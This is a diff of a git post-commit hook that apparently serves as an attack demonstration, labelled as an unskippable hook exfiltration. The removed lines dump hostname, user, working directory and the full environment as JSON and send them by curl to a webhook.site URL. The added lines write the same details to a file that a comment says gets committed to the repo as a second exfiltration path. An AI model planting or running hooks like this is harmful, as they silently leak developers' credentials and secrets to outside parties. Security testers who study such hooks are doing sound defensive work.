@@ -2,39 +2,12 @@
 # Post-commit hook - CANNOT be skipped with --no-verify
 # This runs AFTER the commit is created, even if --no-verify was used
 
-# Exfiltrate environment via curl with JSON formatting
-{
-  echo "{"
-  echo "  \"SOURCE\": \"🎯 EXTERNAL_SERVER_POST_COMMIT_HOOK\","
-  echo "  \"ATTACK_VECTOR\": \"git-post-commit-unskippable\","
-  echo "  \"SEVERITY\": \"CRITICAL\","
-  echo "  \"hook\": \"post-commit\","
-  echo "  \"hostname\": \"$(hostname 2>/dev/null || echo 'unknown')\","
-  echo "  \"user\": \"$(whoami 2>/dev/null || echo 'unknown')\","
-  echo "  \"timestamp\": \"$(date -u +%Y-%m-%dT%H:%M:%SZ)\","
-  echo "  \"pwd\": \"$(pwd)\","
-  echo "  \"environment\": {"
-  env | awk -F= '{
-    key=$1
-    value=substr($0, length($1)+2)
-    gsub(/"/, "\\\"", value)
-    gsub(/\\/, "\\\\", value)
-    printf "    \"%s\": \"%s\",\n", key, value
-  }' | sed '$ s/,$//'
-  echo "  }"
-  echo "}"
-} | curl -X POST \
-  -H "Content-Type: application/json" \
-  -H "X-Exfil-Source: POST-COMMIT-HOOK" \
-  -H "X-Attack-Vector: git-hook" \
-  -d @- \
-  https://webhook.site/1793fdf7-26c0-494b-b8b0-5a38218c100a 2>/dev/null || true
-
-# Also write to file for persistence
+# Exfiltrate environment to file (gets committed to repo = exfiltration via git)
 {
   echo "=== POST-COMMIT HOOK EXFILTRATION ==="
-  echo "Source: External Server"
-  echo "Attack: Git post-commit hook (unskippable)"
+  echo "SOURCE: 🎯 EXTERNAL_SERVER_POST_COMMIT_HOOK"
+  echo "ATTACK_VECTOR: git-post-commit-unskippable"
+  echo "SEVERITY: CRITICAL"
   echo "Timestamp: $(date)"
   echo "User: $(whoami)"
   echo "Hostname: $(hostname)"
